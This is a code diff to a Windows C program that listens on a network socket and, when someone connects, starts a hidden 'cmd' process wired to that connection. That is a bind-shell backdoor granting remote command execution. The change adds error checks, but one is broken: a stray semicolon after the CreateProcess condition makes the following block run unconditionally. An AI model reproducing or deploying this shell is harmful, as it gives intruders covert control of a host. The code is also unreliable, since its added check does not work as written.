@@ -61,22 +61,24 @@ void main(void)
   listen (s, 0);
   r=accept (s, 0, 0);
 
-  memset ((void*)&si, 0, sizeof(si));
+  if (r!=INVALID_SOCKET) {
+    memset ((void*)&si, 0, sizeof(si));
 
-  si.cb         = sizeof(si);
-  si.dwFlags    = STARTF_USESTDHANDLES;
-  si.hStdInput  = (HANDLE)r;
-  si.hStdOutput = (HANDLE)r;
-  si.hStdError  = (HANDLE)r;
+    si.cb         = sizeof(si);
+    si.dwFlags    = STARTF_USESTDHANDLES;
+    si.hStdInput  = (HANDLE)r;
+    si.hStdOutput = (HANDLE)r;
+    si.hStdError  = (HANDLE)r;
 
-  CreateProcess (NULL, "cmd", NULL, NULL, 
-      TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-
-  WaitForSingleObject (pi.hProcess, INFINITE);
+    if (CreateProcess (NULL, "cmd", NULL, NULL, 
+        TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    {
+      WaitForSingleObject (pi.hProcess, INFINITE);
   
-  CloseHandle(pi.hProcess);
-  CloseHandle(pi.hThread);
-  
-  closesocket(r);
+      CloseHandle(pi.hProcess);
+      CloseHandle(pi.hThread);
+    }
+    closesocket(r);
+  }
   closesocket(s);
 }
